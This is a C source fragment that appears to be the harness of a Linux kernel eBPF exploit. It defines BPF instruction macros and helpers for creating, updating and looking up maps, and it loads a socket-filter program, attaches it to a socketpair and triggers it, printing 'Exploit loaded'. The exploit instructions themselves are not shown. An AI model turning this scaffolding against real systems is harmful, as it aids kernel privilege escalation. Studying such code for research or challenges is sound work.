#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)            \
    ((struct bpf_insn) {                    \
        .code  = CODE,                    \
        .dst_reg = DST,                    \
        .src_reg = SRC,                    \
        .off   = OFF,                    \
        .imm   = IMM })

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)                \
    ((struct bpf_insn) {                    \
        .code  = BPF_LD | BPF_DW | BPF_IMM,        \
        .dst_reg = DST,                    \
        .src_reg = SRC,                    \
        .off   = 0,                    \
        .imm   = (__u32) (IMM) }),            \
    ((struct bpf_insn) {                    \
        .code  = 0, /* zero is reserved opcode */    \
        .dst_reg = 0,                    \
        .src_reg = 0,                    \
        .off   = 0,                    \
        .imm   = ((__u64) (IMM)) >> 32 })

/* Memory load, dst_reg = *(uint *) (src_reg + off16) */

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \
    ((struct bpf_insn) {                    \
        .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,    \
        .dst_reg = DST,                    \
        .src_reg = SRC,                    \
        .off   = OFF,                    \
        .imm   = 0 })

/* Memory store, *(uint *) (dst_reg + off16) = src_reg */

#define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \
    ((struct bpf_insn) {                    \
        .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,    \
        .dst_reg = DST,                    \
        .src_reg = SRC,                    \
        .off   = OFF,                    \
        .imm   = 0 })

/* Conditional jumps against immediates, if (dst_reg 'op' imm32) goto pc + off16 */

#define BPF_JMP_IMM(OP, DST, IMM, OFF)                \
    ((struct bpf_insn) {                    \
        .code  = BPF_JMP | BPF_OP(OP) | BPF_K,        \
        .dst_reg = DST,                    \
        .src_reg = 0,                    \
        .off   = OFF,                    \
        .imm   = IMM })

/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */

#define BPF_JMP32_IMM(OP, DST, IMM, OFF)            \
    ((struct bpf_insn) {                    \
        .code  = BPF_JMP32 | BPF_OP(OP) | BPF_K,    \
        .dst_reg = DST,                    \
        .src_reg = 0,                    \
        .off   = OFF,                    \
        .imm   = IMM })

/* Short form of mov, dst_reg = imm32 */

#define BPF_MOV64_IMM(DST, IMM)                    \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU64 | BPF_MOV | BPF_K,        \
        .dst_reg = DST,                    \
        .src_reg = 0,                    \
        .off   = 0,                    \
        .imm   = IMM })

#define BPF_MOV32_IMM(DST, IMM)                    \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU | BPF_MOV | BPF_K,        \
        .dst_reg = DST,                    \
        .src_reg = 0,                    \
        .off   = 0,                    \
        .imm   = IMM })

/* Short form of mov, dst_reg = src_reg */

#define BPF_MOV64_REG(DST, SRC)                    \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU64 | BPF_MOV | BPF_X,        \
        .dst_reg = DST,                    \
        .src_reg = SRC,                    \
        .off   = 0,                    \
        .imm   = 0 })

#define BPF_MOV32_REG(DST, SRC)                    \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU | BPF_MOV | BPF_X,        \
        .dst_reg = DST,                    \
        .src_reg = SRC,                    \
        .off   = 0,                    \
        .imm   = 0 })

/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */

#define BPF_ALU64_IMM(OP, DST, IMM)                \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
        .dst_reg = DST,                    \
        .src_reg = 0,                    \
        .off   = 0,                    \
        .imm   = IMM })

/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */

#define BPF_ALU64_REG(OP, DST, SRC)                \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
        .dst_reg = DST,                    \
        .src_reg = SRC,                    \
        .off   = 0,                    \
        .imm   = 0 })

/* Program exit */

#define BPF_EXIT_INSN()                        \
    ((struct bpf_insn) {                    \
        .code  = BPF_JMP | BPF_EXIT,            \
        .dst_reg = 0,                    \
        .src_reg = 0,                    \
        .off   = 0,                    \
        .imm   = 0 })


/* BPF_LD_IMM64 macro encodes single 'load 64-bit immediate' insn */
#define BPF_LD_IMM64(DST, IMM)                    \
    BPF_LD_IMM64_RAW(DST, 0, IMM)

/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */
#define BPF_LD_MAP_FD(DST, MAP_FD)                \
    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)


#define VERIFIER_LOG_SIZE 0x100000

static int bpf(int cmd, union bpf_attr *attr, unsigned int size){
    return syscall(__NR_bpf, cmd, attr, size);
}

static int create_map(int map_type, uint32_t key_size, uint64_t value_size, uint32_t max_entr, int inner_map_fd){

    union bpf_attr attr = {
        .map_type = map_type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entr
    };

    if (inner_map_fd){
        attr.inner_map_fd = inner_map_fd;
    }

    int map_fd = bpf(BPF_MAP_CREATE, &attr, sizeof(attr));

    if (map_fd < 0){ perror("[-] Error creating map"); exit(1);}

    return map_fd;
}

static int update_map(int map_fd, uint64_t key, void* value, uint64_t flags){
    
    int ret = -1;

    uint64_t kv = key;

    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = (uint64_t)&kv,
        .value = (uint64_t)value,
        .flags = flags
    };

    ret = bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));

    return ret;

}

static int lookup_map(int map_fd, uint64_t key, void* outval){
    int ret = -1;

    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = (uint64_t)&key,
        .value = (uint64_t)outval
    };

    ret = bpf(BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
    return ret;
}

static int create_prog(struct bpf_insn insns[], uint64_t insn_cnt){

    char verifier_log_buff[VERIFIER_LOG_SIZE] = {0};

    int socks[2] = {0};

    int ret = -1;
    int prog_fd = -1;

    union bpf_attr attr = 
    {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = insn_cnt,
        .insns = (uint64_t)insns,
        .license = (uint64_t)"",
        .log_level = 2,
        .log_size = VERIFIER_LOG_SIZE,
        .log_buf = (uint64_t)verifier_log_buff
    };

    prog_fd = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));

    if (prog_fd < 0){
        printf("[-] Program failed! Verifier log: %s\n", verifier_log_buff);
        printf("[-] Errno: %s\n", strerror(errno));
        goto done;
    } else {
        printf("[!] Exploit loaded! FD: %d\n", prog_fd);
        printf("[+] Setting up sockets\n");
    }

    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) != 0){
        perror("[-] socketpair failed");
        goto done;
    }

    if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(int)) != 0 ){
        perror("[-] setsockopt failed");
        goto done;
    }

    if (write(socks[1], "lokete", 6) != 6){
        perror("write");
        goto done;
    }

    puts(verifier_log_buff);

done:
    close(socks[0]);
    close(socks[1]);

    return prog_fd;
}